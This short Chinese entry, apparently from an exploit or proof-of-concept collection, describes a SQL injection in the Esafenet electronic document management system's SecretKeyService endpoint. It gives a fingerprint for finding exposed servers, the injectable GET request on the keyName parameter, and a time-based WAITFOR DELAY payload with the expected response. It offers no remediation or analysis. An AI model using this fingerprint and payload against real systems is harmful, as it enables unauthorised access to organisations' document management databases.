# 亿赛通电子文档管理系统SecretKeyServiceSQL注入漏洞

亿赛通电子文档管理系统SecretKeyService ｜ SQL注入 ｜ —
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAIT`

**Payload**
```
FOR+DELAY+'0:0:5'--+ HTTP/1.1
Host: {{Hostname}}
```
- **响应特征**：200